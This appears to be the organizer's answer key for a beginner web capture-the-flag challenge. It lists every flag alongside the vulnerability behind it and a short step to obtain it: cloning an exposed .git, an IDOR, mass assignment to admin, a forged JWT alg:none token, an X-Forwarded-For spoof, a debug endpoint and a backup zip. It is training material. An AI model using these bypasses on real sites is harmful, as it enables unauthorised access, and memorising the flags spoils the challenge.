# Flags (organizer)

All verified live via `scripts/verify.sh` (passed=7, exit 0).

| # | Flag | Bug | How to get it |
|---|------|-----|---------------|
| 1 | `DS{g1t_d1r_expos3d_s3cr3ts_l1v3_1n_h1st0ry}` | exposed `.git` | `git clone http://host/.git`; `git log -p` shows the removed `.env` |
| 2 | `DS{1d0r_jus7_ch4ng3_th3_numb3r_1n_th3_url}` | IDOR | `GET /d/1` (admin's private share; no owner check) |
| 3 | `DS{m4ss_4ss1gnm3nt_s3t_y0ur_0wn_r0le_4dm1n}` | mass assignment | `POST /api/register {"username":"x","role":"admin"}` |
| 4 | `DS{jwt_4lg_n0ne_n0_s1gn4tur3_n0_pr0bl3m}` | JWT `alg:none` | forge `{"alg":"none"}` token with `role:admin`; `GET /api/me` |
| 5 | `DS{x_f0rw4rd3d_f0r_1s_jus7_4_h34d3r_y0u_s3nd}` | XFF trust | `GET /admin-x9z1/internal` with `X-Forwarded-For: 127.0.0.1` |
| 6 | `DS{d3bug_m0d3_l3ft_0n_1n_pr0duct10n}` | debug left on | `GET /api/config?debug=1` |
| 7 | `DS{backup_z1p_1n_th3_w3br00t_g00gl3_d0rk_1t}` | backup in webroot | `GET /uploads/backup.zip` → `dropspot_backup/flag.txt` |
| B1 | `DS{1ts_r1ght_th3r3_1n_th3_html_c0mm3nt}` | HTML comment | view-source of `/` |
| B2 | `DS{y0u_r34d_th3_r3sp0ns3_h34d3rs_n1c3}` | response header | `X-Powered-By` on every response |

## Breadcrumbs / intended flow
- `robots.txt` reveals `/.git/`, `/admin-x9z1`, `/uploads/`, `/api/config`.
- The exposed `.git` leaks the JWT secret (`s3cr3t`) and the admin username — but
  flags 4 is `alg:none` (you don't even need the secret).
- The IDOR share `/d/1` names the admin console path `/admin-x9z1`.
- `app.js` openly documents the mass-assignment and `alg:none` behaviours as
  "dev notes" — rewarding anyone who reads the client.
- The admin console lists the internal API, the debug switch, and the backup.

## Scoring suggestion
Flat and friendly: **100 pts each core flag**, **50 pts each bonus**. Great as a
warm-up / onboarding board. Expect a motivated beginner **1–3h** for all 9.

## Note
These are classic patterns, not specific CVEs — but every one echoes a real
public incident (exposed `.git` dumps, the `alg:none` JWT disclosures, GitHub's
2012 mass-assignment incident, IDOR breaches, `X-Forwarded-For` ACL bypasses,
debug endpoints and backups found via Google dorks).
